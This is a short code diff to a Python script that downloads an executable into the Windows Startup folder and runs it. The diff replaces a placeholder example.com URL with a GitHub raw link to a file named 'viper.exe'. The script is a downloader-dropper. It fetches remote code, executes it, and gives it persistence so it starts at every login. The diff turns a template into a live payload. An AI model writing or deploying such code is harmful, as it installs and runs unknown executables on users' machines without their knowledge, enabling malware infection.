@@ -5,7 +5,7 @@ file = os.environ['APPDATA'] + "\Microsoft\Windows\Start Menu\Programs\Startup\v
 
 def executable():
      # Download the executable to the Startup folder
-     url = 'http://example.com/example.exe'
+     url = 'https://raw.githubusercontent.com/NotoriusNeo/viper/main/viper.exe'
      urllib.request.urlretrieve(url, file)
      # Run the executable
      os.system(file)
